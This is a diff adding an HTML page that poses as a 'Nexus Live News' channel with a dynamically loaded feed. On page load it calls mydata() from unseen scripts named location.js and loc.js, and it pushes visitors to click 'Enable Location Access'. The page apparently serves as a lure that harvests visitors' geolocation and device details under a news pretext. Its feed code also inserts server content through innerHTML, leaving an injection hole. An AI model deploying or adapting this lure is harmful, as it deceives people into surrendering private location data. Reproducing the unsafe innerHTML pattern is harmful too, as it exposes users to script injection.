@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live News - Nexus News Channel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
+            color: #fff;
+            min-height: 100vh;
+        }
+        
+        .live-banner {
+            background: #ff0000;
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .live-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            background: #fff;
+            border-radius: 50%;
+            margin-right: 10px;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        .news-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 30px 20px;
+        }
+        
+        .news-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .news-header h1 {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        
+        .live-feed {
+            background: rgba(255,255,255,0.1);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .feed-item {
+            padding: 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            margin-bottom: 15px;
+        }
+        
+        .feed-item:last-child {
+            border-bottom: none;
+        }
+        
+        .feed-time {
+            color: #ffd700;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        
+        .feed-title {
+            font-size: 20px;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+        
+        .location-section {
+            background: rgba(255,255,255,0.15);
+            border-radius: 10px;
+            padding: 25px;
+            text-align: center;
+            margin-top: 30px;
+        }
+        
+        .location-section h3 {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: #ffd700;
+        }
+        
+        .btn-enable {
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 15px;
+        }
+        
+        .btn-enable:hover {
+            background: #cc0000;
+            transform: scale(1.05);
+        }
+    </style>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/location.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+</head>
+<body onload="mydata()">
+    <div class="live-banner">
+        <span class="live-indicator"></span>
+        LIVE NEWS COVERAGE
+    </div>
+    
+    <div class="news-container">
+        <div class="news-header">
+            <h1>📺 NEXUS LIVE NEWS</h1>
+            <p>Real-Time News Coverage</p>
+        </div>
+        
+        <div class="live-feed" id="liveFeed">
+            <!-- News items will be loaded dynamically here -->
+            <div class="feed-item">
+                <div class="feed-time">Loading...</div>
+                <div class="feed-title">Loading live news feed...</div>
+                <p>Please wait while we load the latest updates.</p>
+            </div>
+        </div>
+        
+        <script>
+            // Load live news items dynamically
+            function loadLiveNews() {
+                fetch('../../news_api.php?type=live_news')
+                    .then(response => response.json())
+                    .then(data => {
+                        const feedContainer = document.getElementById('liveFeed');
+                        feedContainer.innerHTML = '';
+                        
+                        if (data.error) {
+                            feedContainer.innerHTML = '<div class="feed-item"><div class="feed-title">Error: ' + data.error + '</div></div>';
+                            return;
+                        }
+                        
+                        data.forEach(item => {
+                            const feedItem = document.createElement('div');
+                            feedItem.className = 'feed-item';
+                            
+                            const time = document.createElement('div');
+                            time.className = 'feed-time';
+                            time.textContent = (item.is_live ? '🔴 LIVE • ' : '') + (item.timestamp || 'Just Now');
+                            
+                            const title = document.createElement('div');
+                            title.className = 'feed-title';
+                            title.textContent = item.title;
+                            
+                            const content = document.createElement('p');
+                            content.innerHTML = item.content.replace(/\n/g, '<br>');
+                            
+                            feedItem.appendChild(time);
+                            feedItem.appendChild(title);
+                            feedItem.appendChild(content);
+                            
+                            feedContainer.appendChild(feedItem);
+                        });
+                    })
+                    .catch(error => {
+                        console.error('Error loading live news:', error);
+                        document.getElementById('liveFeed').innerHTML = 
+                            '<div class="feed-item"><div class="feed-title">Error loading live news</div></div>';
+                    });
+            }
+            
+            // Load news when page is ready
+            window.addEventListener('load', function() {
+                loadLiveNews();
+            });
+        </script>
+        
+        <div class="location-section">
+            <h3>📍 Enable Location for Live News</h3>
+            <p>
+                Click below to allow location access and receive live news updates 
+                customized for your area. Stay informed with real-time coverage.
+            </p>
+            <button id="change" class="btn-enable" onclick="locate()">
+                Enable Location Access
+            </button>
+            <div id="result" style="margin-top: 20px; font-size: 14px; opacity: 0.8;"></div>
+        </div>
+    </div>
+</body>
+</html>
+
